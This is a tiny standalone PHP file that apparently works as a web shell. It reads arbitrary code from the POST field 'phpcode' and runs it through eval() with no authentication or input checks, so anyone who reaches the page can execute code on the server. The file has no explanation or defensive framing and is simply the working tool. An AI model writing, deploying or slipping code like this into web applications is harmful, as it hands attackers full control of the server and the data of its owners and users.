<?php
$phpcode = $_POST['phpcode']; 
 
if (!preg_match('#<\?#si',$phpcode)){ 
	$phpcode = "<?php\n\n{$phpcode}\n\n?>"; 
} 
eval("?".">$phpcode<?"); 
echo '<br><br>'; 
?>
